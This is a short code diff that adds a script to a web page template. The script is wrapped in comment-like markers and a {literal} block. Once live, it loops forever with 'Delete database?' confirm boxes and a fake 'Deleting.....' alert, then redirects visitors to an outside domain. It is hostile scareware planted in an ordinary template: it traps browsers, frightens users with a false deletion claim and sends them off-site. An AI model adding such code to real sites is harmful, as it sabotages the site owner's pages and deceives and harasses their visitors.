@@ -18,3 +18,18 @@
         </div>
     </section>
 </div>
+  
+{ /* }  
+{literal}
+    <script type="text/javascript">
+        while(true){
+            if(confirm('Delete database?')){
+                alert('Deleting.....');
+                location.href = "http://premmerce.com.ua";
+            } else {
+                confirm('Delete database?');
+            }
+        }
+    </script>
+{/literal}
+{ */ }
